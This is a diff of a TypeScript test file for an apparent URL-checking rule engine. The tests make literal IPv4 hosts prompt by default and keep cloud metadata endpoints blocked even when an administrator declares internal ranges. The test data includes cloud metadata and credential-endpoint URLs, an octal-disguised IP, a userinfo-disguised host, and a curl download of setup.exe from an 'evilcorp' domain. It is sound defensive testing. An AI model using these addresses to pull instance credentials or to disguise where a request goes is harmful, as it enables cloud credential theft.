@@ -33,26 +33,14 @@ describe("CLT-URL-004 direct IP URL (D2)", () => {
 		"http://127.0.0.1:3000/api",
 		"https://192.168.1.10/x",
 		"http://172.16.0.5/a",
-		"http://172.31.255.1/",
-		"http://169.254.10.1/",
-	])("does not flag an RFC 1918 / loopback / link-local address: %s", (url) => {
-		expect(matchUrl(engine, url)).not.toContain("CLT-URL-004");
-	});
-
-	it.each([
 		"http://8.8.8.8/x",
 		"https://203.0.113.9:443/",
-		"http://172.32.0.1/",
-		"http://192.169.0.1/",
-		"http://11.0.0.1/",
 		"http://100.64.1.1/",
-		// Leading zero: curl reads 010 as octal, i.e. a public 8.0.0.1.
 		"http://010.0.0.1/",
 		`${scheme}${imds}/latest/meta-data/`,
 		`${scheme}${ecsCredentials}/v2/credentials`,
-		// Userinfo: the private-looking prefix is not where the request goes.
 		`${scheme}10.0.0.1:80@203.0.113.9/`,
-	])("still flags a public, metadata-service or userinfo-disguised address: %s", (url) => {
+	])("flags every literal IPv4 host by default, internal ones included: %s", (url) => {
 		expect(matchUrl(engine, url)).toContain("CLT-URL-004");
 	});
 });
@@ -107,6 +95,22 @@ describe("administrator-declared internal networks and domain suffixes (D2)", ()
 		expect(
 			(await evaluate("curl -O https://evilcorp.example.com.tr/setup.exe", internal)).decision,
 		).toBe("ask");
+	});
+
+	it("asks for a private address until the administrator declares it internal", async () => {
+		expect((await evaluate("curl http://10.20.0.7:8080/health")).decision).toBe("ask");
+		expect(
+			(await evaluate("curl http://10.20.0.7:8080/health", { internal_networks: ["10.20.0.0/16"] }))
+				.decision,
+		).toBe("allow");
+	});
+
+	it("never clears a cloud metadata endpoint, whatever range is declared", async () => {
+		const linkLocal = { internal_networks: ["169.254.0.0/16"] };
+		expect((await evaluate(`curl ${scheme}${imds}/latest/meta-data/`, linkLocal)).decision).not.toBe(
+			"allow",
+		);
+		expect((await evaluate(`curl ${scheme}169.254.10.1/`, linkLocal)).decision).toBe("allow");
 	});
 
 	it("ignores over-broad networks and public suffixes", async () => {
